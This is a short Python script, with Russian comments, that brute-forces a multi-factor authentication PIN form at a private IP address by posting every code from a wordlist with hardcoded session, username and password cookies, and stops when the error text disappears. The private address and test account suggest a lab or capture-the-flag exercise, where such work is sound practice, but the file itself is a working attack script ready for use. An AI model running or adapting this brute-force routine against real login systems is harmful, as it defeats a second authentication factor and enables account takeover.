import requests
import sys

url = "http://10.49.181.252/console/mfa.php"
cookies = {
    "PHPSESSID": "s3cildqj1lbh81jcv7mep29bbq",
    "user": "jason_test_account",
    "pwd": "BABYFACE"
}

# Загрузите список PIN-кодов
with open("pins.txt", "r") as f:
    pins = [line.strip() for line in f if line.strip()]

print(f"[+] Starting attack with {len(pins)} pins...")

for pin in pins:
    data = {"code": pin}
    response = requests.post(url, cookies=cookies, data=data)
    
    # Проверьте условие успеха. Например, если в ответе НЕТ слова "Invalid"
    if "Incorrect code" not in response.text and "Error" not in response.text:
        print(f"[+] SUCCESS! Pin found: {pin}")
        print(response.text[:200]) # Показать начало ответа
        sys.exit(0)
    else:
        print(f"[-] Failed with pin: {pin}", end='\r')

print("\n[!] No valid pin found.")
